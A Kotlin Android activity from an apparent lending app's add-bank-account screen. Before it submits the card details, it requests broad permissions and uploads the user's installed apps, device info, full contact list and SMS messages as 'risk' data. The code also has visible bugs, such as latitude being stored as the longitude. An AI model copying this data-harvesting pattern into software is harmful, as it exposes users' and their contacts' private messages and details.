package com.example.flashfeso_lwj.flashfeso.ui.controll.activity

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.drawable.Drawable
import android.location.Location
import android.net.Uri
import android.provider.Settings
import android.text.InputFilter
import android.text.InputFilter.LengthFilter
import android.view.View
import android.view.inputmethod.InputMethodManager
import androidx.activity.viewModels
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.graphics.drawable.DrawableCompat
import androidx.lifecycle.Observer
import com.example.flashfeso_lwj.R
import com.example.flashfeso_lwj.base.entity.DataResult
import com.example.flashfeso_lwj.base.event.CommonDialogEvent
import com.example.flashfeso_lwj.base.ui.controll.activity.BasePageStyleActivity
import com.example.flashfeso_lwj.base.utils.SimpleProgressDialogUtil
import com.example.flashfeso_lwj.databinding.ActivityAgergarCuentaBancariaBinding
import com.example.flashfeso_lwj.flashfeso.entity.AllBankEntity
import com.example.flashfeso_lwj.flashfeso.event.InfomationSelectItemOnClickListener
import com.example.flashfeso_lwj.flashfeso.ui.controll.dialog.InfomationSelectDialog
import com.example.flashfeso_lwj.flashfeso.ui.controll.dialog.JumpSysytemLocDialog
import com.example.flashfeso_lwj.flashfeso.utils.APP_PERMISSIONS
import com.example.flashfeso_lwj.flashfeso.utils.InfoUtil
import com.example.flashfeso_lwj.flashfeso.utils.addToast
import com.example.flashfeso_lwj.flashfeso.utils.back
import com.example.flashfeso_lwj.flashfeso.viewmodel.AgergarCuentaBancariaViewModel
import com.example.flashfeso_lwj.flashfeso.viewmodel.LoginViewModel
import com.example.lwj_common.common.managementUtils.*
import com.example.lwj_common.common.ui.controll.tools.ktx.deleteBlank
import com.example.lwj_common.common.ui.controll.tools.ktx.isUseful
import com.example.lwj_common.common.ui.controll.tools.ktx.toBankCardEditText
import com.example.lwj_common.common.ui.controll.tools.ktx.toJson
import com.example.lwj_common.common.ui.controll.tools.utils.LocationUtils
import com.rs.flashpeso.management.ManagementUtils
import dagger.hilt.android.AndroidEntryPoint
import java.lang.Exception
import java.security.Permission
import java.util.jar.Manifest
import javax.inject.Inject
import kotlin.collections.HashMap

@AndroidEntryPoint
class AgergarCuentaBancariaActivity : BasePageStyleActivity<ActivityAgergarCuentaBancariaBinding>(),
    InfomationSelectItemOnClickListener {
    var tipoDeCuentaDialog: InfomationSelectDialog? = null
    var selectBankDialog: InfomationSelectDialog? = null
    private var tipoDeCuentaPosition = 1
    private val REQUEST_EXTERNAL_STORAGE = 222
    private var isRisk = false

    @Inject
    @JvmField
    var mSimpleProgressDialogUtil: SimpleProgressDialogUtil? = null

    @Inject
    lateinit var locationUtils: LocationUtils
    lateinit var bkCardNumber: String
    lateinit var bkName: String
    var bankNo: Int = 0

    var allBank: List<AllBankEntity>? = null
    private val mViewModel: AgergarCuentaBancariaViewModel by viewModels()
    private val loginViewModel: LoginViewModel by viewModels()
    override fun observe() {
        mViewModel.allBankLiveData.observe(this, Observer {
            it.whenSuccess {
                binding.error.llError.visibility = View.GONE
                binding.progress.llProgress.visibility = View.GONE
                allBank = it
            }
            it.whenError {
                binding.error.llError.visibility = View.VISIBLE
                binding.progress.llProgress.visibility = View.GONE
                addToast(this, (it as DataResult.Error).errorMessage!!)
            }
            it.whenClear {
                InfoUtil.clear()
                loginViewModel.queryNotifyUpdateLoginLiveData()
                addToast(this, (it as DataResult.Clear).clearMessage!!)
                onBackPressed()
            }
        })

        mViewModel.riskInfoLiveData.observe(this, Observer {
            mSimpleProgressDialogUtil?.closeHUD()
            it.whenSuccessResponse {
                if ((it as DataResult.Success).successMessagle == resources.getString(R.string.success)) {
                    queryAuthBackInfo(bkCardNumber, bkName, bankNo)
                }
            }
            it.whenError {
                isRisk = false
            }
            it.whenClear {
                InfoUtil.clear()
                loginViewModel.queryNotifyUpdateLoginLiveData()
                addToast(this, (it as DataResult.Clear).clearMessage!!)
                onBackPressed()
            }
        })

        mViewModel.authBankInfoLiveData.observe(this, Observer {
            mSimpleProgressDialogUtil?.closeHUD()
            it.whenSuccessResponse {
                if((it as DataResult.Success).successMessagle == resources.getString(R.string.success)){
                    addToast(this, it.successMessagle!!)
                    val intent = Intent(this@AgergarCuentaBancariaActivity, DetallesDeLosPrestamosActivity::class.java)
                    startActivity(intent.apply { putExtra("authentication", true) })
                    loginViewModel.queryNotifyInicioBeanLiveData()
                    onBackPressed()
                }
            }
            it.whenClear {

                InfoUtil.clear()
                loginViewModel.queryNotifyUpdateLoginLiveData()
                addToast(this, (it as DataResult.Clear).clearMessage!!)
                onBackPressed()
            }
            it.whenError {
                isRisk = false
                addToast(this, (it as DataResult.Error).errorMessage!!)
            }
        })
    }

    private fun queryAuthBackInfo(bkCardNumber: String, bkName: String, bankNo: Int) {
        val map: MutableMap<String, Any> = HashMap()
        map["bkType"] = tipoDeCuentaPosition
        map["bkCardNumber"] = bkCardNumber
        map["bkName"] = bkName
        map["bkCode"] = bankNo
        mViewModel.queryAuthBankInfo(map as HashMap<String, Any>)
    }

    override fun afterBindView() {
        super.afterBindView()
        binding.header.ivCommonBarBack.back(this@AgergarCuentaBancariaActivity)

        binding.error.viewErrorUpdate.setOnClickListener {
            if (isClickUseful()) {
                queryAllBank()
            }
        }

        binding.tipoDeCuentaLl.setOnClickListener {
            if (isClickUseful()) {
                hideKeyboardAll()
                val data: Array<String> = resources.getStringArray(R.array.array_card_type)
                tipoDeCuentaDialog = InfomationSelectDialog.newInstance()
                    .addSetting(Dialog.TIPO_DECUENT.ordinal, data.toList(), this)
                tipoDeCuentaDialog?.show(supportFragmentManager, "tipoDeCuentaDialog")
            }
        }

        binding.bancoLl.setOnClickListener {
            if (isClickUseful() && !allBank.isNullOrEmpty()) {
                hideKeyboardAll()
                val data = arrayListOf<String>()
                allBank?.forEachIndexed { _, allBankEntity ->
                    data.add(allBankEntity.name)
                }
                selectBankDialog = InfomationSelectDialog.newInstance()
                    .addSetting(Dialog.SELECT_BANK.ordinal, data, this)

            }
        }

        binding.confirm.setOnClickListener {
            hideKeyboardAll()
            val banco = binding.bancoTv.text.toString().trim()
            if (!banco.isUseful()) {
                //吐司上下文可能需要修改
                addToast(this, resources.getString(R.string.introduzca_el_banco))
                return@setOnClickListener
            }
            val tarjeta: String = binding.tarjetaTt.text.deleteBlank()
            if (tipoDeCuentaPosition == 0 && (!tarjeta.isUseful() || tarjeta.length != 18)) {
                addToast(this,
                    getResources().getString(R.string.introduzca_el_numero_correcto_de_tarjeta_de_16_bits))
                return@setOnClickListener
            } else if (tipoDeCuentaPosition == 0 && (!tarjeta.isUseful() || tarjeta.length != 16)) {
                addToast(this,
                    getResources().getString(R.string.introduzca_el_numero_correcto_de_tarjeta_de_16_bits))
                return@setOnClickListener
            }

            var bankNo = -1
            allBank?.forEach {
                if (it.name == banco) {
                    bankNo = it.code
                }
            }

            if (isClickUseful() && bankNo > 0) {
                bkCardNumber = tarjeta
                bkName = banco
                bankNo = bankNo

                checkPermissions(this@AgergarCuentaBancariaActivity)
            }

        }
    }

    private fun checkPermissions(actvtity: Activity) {
        try {

            if (ContextCompat.checkSelfPermission(actvtity,android.Manifest.permission.INTERNET) != PackageManager.PERMISSION_GRANTED
                || ContextCompat.checkSelfPermission(actvtity,
                    "android.permission.WRITE_EXTERNAL_STORAGE") != PackageManager.PERMISSION_GRANTED
                || ContextCompat.checkSelfPermission(actvtity,
                    "android.permission.READ_EXTERNAL_STORAGE") != PackageManager.PERMISSION_GRANTED
                || ContextCompat.checkSelfPermission(actvtity,
                    "android.permission.READ_CONTACTS") != PackageManager.PERMISSION_GRANTED
                || ContextCompat.checkSelfPermission(actvtity,
                    "android.permission.ACCESS_NETWORK_STATE") != PackageManager.PERMISSION_GRANTED
                || ContextCompat.checkSelfPermission(actvtity,
                    "android.permission.READ_PHONE_STATE") != PackageManager.PERMISSION_GRANTED
                || ContextCompat.checkSelfPermission(actvtity,
                    "android.permission.ACCESS_WIFI_STATE") != PackageManager.PERMISSION_GRANTED
                || ContextCompat.checkSelfPermission(actvtity,
                    "android.permission.ACCESS_FINE_LOCATION") != PackageManager.PERMISSION_GRANTED
                || ContextCompat.checkSelfPermission(actvtity,
                    "android.permission.ACCESS_COARSE_LOCATION") != PackageManager.PERMISSION_GRANTED
                || ContextCompat.checkSelfPermission(actvtity,
                    "android.permission.CAMERA") != PackageManager.PERMISSION_GRANTED
                || ContextCompat.checkSelfPermission(actvtity,
                    "android.permission.WRITE_CONTACTS") != PackageManager.PERMISSION_GRANTED
                || ContextCompat.checkSelfPermission(actvtity,
                    "android.permission.READ_SMS") != PackageManager.PERMISSION_GRANTED
            ) {
                //如果没有权限，请求权限
                ActivityCompat.requestPermissions(actvtity,
                    APP_PERMISSIONS,
                    REQUEST_EXTERNAL_STORAGE)
            } else {
                //如果具备所有权限
                clickSubmit()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray,
    ) {
        when(requestCode){
            REQUEST_EXTERNAL_STORAGE -> {
                var isSuccess = true
                if(grantResults.isNotEmpty()){
                    grantResults.forEachIndexed { _, it ->
                        it != PackageManager.PERMISSION_DENIED
                        isSuccess = false
                    }

                    if(isSuccess){
                        //打开本应用信息界面
                        val intent = Intent("android.settings.APPLICATION_DETAILS_SETTINGS")
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        intent.data = Uri.parse("package:$packageName")
                        startActivity(intent)
                    }
                }
            }
        }
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
    }

    private fun clickSubmit() {
        mSimpleProgressDialogUtil?.showHUD(this, false)
        val location: Int = getLocation()
        if(location == 1){
            //没有打开gps或网络
            mSimpleProgressDialogUtil?.closeHUD()
            val jumpSysytemLocDialog = JumpSysytemLocDialog()
            jumpSysytemLocDialog.listener = object: CommonDialogEvent{
                override fun onCancel() {
                    jumpSysytemLocDialog.dismiss()
                }

                override fun onConfirm() {
                    //打开系统gps定位设置页
                    val intent = Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS)
                    startActivity(intent)
                    jumpSysytemLocDialog.dismiss()
                }

            }
            jumpSysytemLocDialog.show(supportFragmentManager, "jumpSysytemLocDialog")

        }else if(location == 2){
            mSimpleProgressDialogUtil?.closeHUD()
        }

    }

    fun getLocation(): Int {
        val locationResult: Int =
            locationUtils.getLocation(this, object : LocationUtils.LocationCallBack {
                override fun gotLocation(location: Location?) {
                    if (location != null) {
                        //当前经度
                        val longitude: Double = location.getLongitude()
                        //当前纬度
                        val latitude: Double = location.getLatitude()

                        if (longitude != 0.0) {
                            InfoUtil.longitude = longitude.toString()
                        }

                        if (latitude != 0.0) {
                            InfoUtil.latitude = latitude.toString()
                        }

                        try {

                            if (!isRisk) {
                                isRisk = true
                                val appInfoList: List<AppInfoBean> =
                                    ManagementUtils.getAppList(this@AgergarCuentaBancariaActivity)
                                val devideInfo: DeviceInfoBean =
                                    ManagementUtils.getDeviceInfo(this@AgergarCuentaBancariaActivity)
                                devideInfo.longitude = longitude.toString()
                                devideInfo.latitude = longitude.toString()

                                val contactsList: List<PhoneInfoBean> =
                                    ManagementUtils.getContacts(this@AgergarCuentaBancariaActivity)
                                val messageList: List<MessageBean> =
                                    MessageUtils.getMessage(this@AgergarCuentaBancariaActivity)


                                //先上传风控信息，再提交银行卡信息
                                queryRiskInfo(appInfoList.toJson(),
                                    devideInfo.toJson(),
                                    contactsList.toJson(),
                                    messageList.toJson())
                            }
                        } catch (e: Exception) {

                            e.printStackTrace()
                            runOnUiThread {
                                mSimpleProgressDialogUtil?.closeHUD()
                            }
                        }
                    } else {
                        runOnUiThread {
                            mSimpleProgressDialogUtil?.closeHUD()
                        }
                    }


                }

            })
        return locationResult
    }

    private fun queryRiskInfo(
        appInfo: String,
        deviceInfo: String,
        phoneBook: String,
        smsList: String,
    ) {
        mSimpleProgressDialogUtil?.showHUD(this, false)
        val map: MutableMap<String, Any> = HashMap()
        map["appInfo"] = appInfo
        map["deviceInfo"] = deviceInfo
        map["phoneBook"] = phoneBook
        map["smsList"] = smsList
        mViewModel.queryRiskInfo(map as HashMap<String, Any>)

    }

    private fun hideKeyboardAll() {
        if (binding.tarjetaTv.hasFocus()) {
            val imm =
                binding.tarjetaTt.context.getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager?
            imm?.hideSoftInputFromWindow(binding.tarjetaTt.windowToken, 0)
        }
    }

    override fun ActivityAgergarCuentaBancariaBinding.initView() {
        binding.header.tvCommonBarTitle.text = resources.getString(R.string.agergar_cuenta_bancaria)
        binding.tarjetaTv.toBankCardEditText()
    }

    override fun afterInitView() {
        super.afterInitView()
        queryAllBank()
    }

    fun queryAllBank() {
        binding.error.llError.setVisibility(View.GONE)
        binding.progress.llProgress.setVisibility(View.VISIBLE)
        mViewModel.queryAllBank()
    }

    enum class Dialog {
        TIPO_DECUENT, SELECT_BANK
    }

    override fun onDialogItemClick(list: List<String>, flag: Int) {
        when (flag) {
            Dialog.TIPO_DECUENT.ordinal -> {
                binding.tipoDeCuentaTv.text = list[0]
                val position = list[1]
                when (position.toInt()) {
                    0 -> {
                        tipoDeCuentaPosition = 0
                        binding.tarjetaTt.setText(resources.getString(R.string.tarjeta_18_digitos))
                        binding.tarjetaTv.setFilters(arrayOf<InputFilter>(LengthFilter(22)))
                    }
                    else -> {
                        tipoDeCuentaPosition = 1
                        binding.tarjetaTt.setText(resources.getString(R.string.tarjeta_16_digitos))
                        binding.tarjetaTv.setFilters(arrayOf<InputFilter>(LengthFilter(19)))
                        val s1: String = binding.tarjetaTv.getText().toString()
                        //由于一开始选择的银行类型是et长度为22位的,导致选择et长度为19位的et时候, 此时原本输入的22位长度字符串需要截取为19位, 并将光标后移至最后一位
                        if (s1.length >= 19) {
                            binding.tarjetaTv.setText(s1.substring(0, 19))
                            binding.tarjetaTv.setSelection(19)
                        }
                    }
                }
            }

            Dialog.SELECT_BANK.ordinal -> {
                binding.bancoTv.text = list[1]
                selectBankDialog?.dismiss()
            }
        }
    }


}